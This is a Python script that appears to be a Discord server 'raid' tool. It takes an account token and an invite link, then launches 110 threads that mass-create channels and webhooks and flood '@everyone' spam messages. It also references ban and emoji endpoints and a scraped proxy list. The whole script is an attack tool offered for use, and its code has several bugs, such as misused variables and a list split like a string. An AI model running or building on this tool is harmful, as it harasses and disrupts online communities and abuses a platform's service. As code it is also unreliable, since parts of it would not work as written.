try:
    import requests
    import threading
    import sys
    import os 
except:
    import os 
    os.system('pip install requests')
    os.system('pip install threading')
    os.system('pip install sys')

def getheaders(token):
    headers =     {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    }
    if token:
        headers.update({"Authorization": util["token"]})
        return headers

token = input('token : ')
util = {
        "token" : token
}

invite_link = input('invitation link : ')
try:
    invite_link = invite_link.split("/")[3]
    r = requests.get(f"https://discord.com/api/v9/invites/{invite_link}",headers = getheaders(token))
    if r.status_code == 200:
        pass
        guild_id = r.json()["guild"]["id"]
    else:
        print('please enter a valid token')
        print(f'error : {r.json()}')
except:
    print('invitaion not available')
    sys.exit()

#you can change the value with your's 

util = {"guild_id" : guild_id,
        "webhook_name" : "Raid by bks",
        "message_content" : "@everyone ez raid bro ",
        "channel_name" : "raid by bks",
        "token" : token
}

url =  {"channel" : "https://discord.com/api/v9/guilds/{guild_id}/channels",
        "webhook" : "https://discord.com/api/v9/channels/{channel_id}/webhooks",
        "message" : "https://discord.com/api/webhooks/{webhook_id}/{webhook_token}",
        "proxy" : "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "kick_url" : "https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}",
        "add_emoji" : "https://discord.com/api/v9/guilds/{guild_id}/emojis"
}

def proxy_scrape(url):
    turn = 0
    url = url['proxy']
    pro = requests.get(url).text
    proxy_list = [pro]
    proxy = proxy_list.split("\n")
    print(proxy)

def raid(util, url):
    channel_create = 0
    webhook_create = 0
    message_sent = 0    
    def spam():
        
        for i in range(1):
            channel = requests.post(url["channel"].format(guild_id = util['guild_id']),
                        json={"name": util[f"channel_name"],'content': 'raid'},
                        headers =getheaders(util[f"token"]),
                    ).json()
            channel_create = channel_create + 1
            os.system(f'Title - RAIDER BOT - Channel create : {channel_create} webhook_create : {webhook_create} message sent : {message_sent}')
            print(channel)
            channel_id = channel['id']
            for i in range(10):
                webhook = requests.post(url["webhook"].format(channel_id = channel_id),
                            json={"name": util["webhook_name"],'content': 'raid'},
                            headers =getheaders(util["token"])
                        )
                if webhook.status_code == 200:
                    webhook_create = webhook_create + 1
                    os.system(f'Title - RAIDER BOT - Channel create : {channel_create} webhook_create : {webhook_create} message sent : {message_sent}')
                    pass
                else:
                    print('error rate limit')
                webhook = webhook.json()    
                if 'rate limit' in webhook.get('message', ''):
                    print('error rate limit')
                    break
                else: 
                    webhook_token = webhook['token']
                    webhook_id = webhook['id']
                    for i in range(30):  
                        message = requests.post(url['message'].format(webhook_id = webhook_id, webhook_token = webhook_token),
                                    json={"name": util["channel_name"],'content': util["message_content"]},
                                    headers =getheaders(util["token"])
                                )
                        if message.status_code == 204:
                            message_sent = message_sent + 1 
                            os.system(f'Title - RAIDER BOT - Channel create : {channel_create} webhook_create : {webhook_create} message sent : {message_sent}')
                            pass
                        
                        else:
                            print("An error occured while sending message")
                            print(f"error : {message.json()}")
                            input("Enter anything to close")
                            sys.exit()
    threads = []
    for i in range(110):
        t = threading.Thread(target=spam)
        threads.append(t)
        t.start()

raid(util, url)
